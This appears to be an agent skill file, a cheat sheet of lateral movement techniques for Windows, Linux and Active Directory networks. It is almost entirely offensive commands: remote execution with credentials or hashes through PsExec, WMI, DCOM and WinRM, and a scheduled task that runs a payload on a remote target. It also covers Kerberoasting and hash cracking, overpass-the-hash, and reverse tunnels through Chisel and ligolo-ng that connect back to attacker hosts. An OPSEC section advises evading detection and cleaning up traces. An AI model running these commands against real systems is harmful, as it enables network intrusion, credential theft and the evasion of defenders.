---
name: lateral-movement
description: SMB/WinRM pivoting, SSH tunneling, internal network traversal.
---

# Lateral Movement Techniques

## 1. Windows Lateral Movement

### PsExec (SMB)
```bash
impacket-psexec domain/user:password@target
# Or with hash
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee domain/user@target
```

### WinRM (5985/5986)
```bash
evil-winrm -i target -u user -p password -P 5985
# With PowerShell modules
evil-winrm -i target -u user -p password -s /path/to/scripts/ -e /path/to/exec.ps1
```

### WMI
```bash
impacket-wmiexec domain/user:password@target
# Or via PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName target
```

### DCOM
```python
# Use dcomexec.py from Impacket
impacket-dcomexec domain/user:password@target
```

### Scheduled Tasks
```bash
schtasks /create /s target /tn "Updater" /tr "C:\temp\payload.exe" /sc daily /u domain\user /p password
schtasks /run /s target /tn "Updater"
```

## 2. Linux Lateral Movement

### SSH
```bash
# Key-based
ssh -i key.pem user@target
# SSH tunnel (SOCKS proxy)
ssh -D 1080 user@jump_host
# SSH port forwarding
ssh -L 8080:internal_host:80 user@jump_host
```

### Pass-the-Hash (Linux)
```bash
# Using crackmapexec
crackmapexec ssh target -u user -p hash
# Using hashcat to crack
hashcat -m 7400 hash.txt wordlist.txt
```

## 3. Pivoting

### Chisel (SOCKS Proxy)
```bash
# Server (attacker)
chisel server --reverse --port 8000
# Client (target)
chisel client attacker_ip:8000 R:socks
# Then: proxychains nmap -sT internal_target
```

### SSH Tunneling
```bash
# Dynamic proxy
ssh -D 9050 user@jump_host
# Local port forward
ssh -L 3389:dc.internal:3389 user@jump_host
```

### ligolo-ng
```bash
# Proxy
ligolo-proxy -selfcert
# Agent (on target)
ligolo-agent -connect attacker:11601 -retry -ignore-cert
```

## 4. Active Directory Lateral Movement

### Kerberoasting → Pass-the-Ticket
```bash
# Kerberoast
impacket-GetUserSPNs domain/user:password -request -dc-ip dc_ip
# Crack tickets
hashcat -m 13100 tickets.txt wordlist.txt
# Use cracked password
impacket-psexec domain/svc_account:cracked_pass@target
```

### Overpass-the-Hash
```bash
# Get NTLM from Kerberos
impacket-getTGT domain/user:password -dc-ip dc_ip
# Use ticket for auth
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain/user@target
```

## 5. OPSEC Considerations

- Use built-in tools (Living off the Land)
- Avoid noisy tools like mimikatz in memory
- Clean up scheduled tasks and users
- Use encrypted channels (HTTPS, SMB signing)
- Monitor for Event IDs: 4624 (logon), 4648 (explicit creds), 5140 (share access)
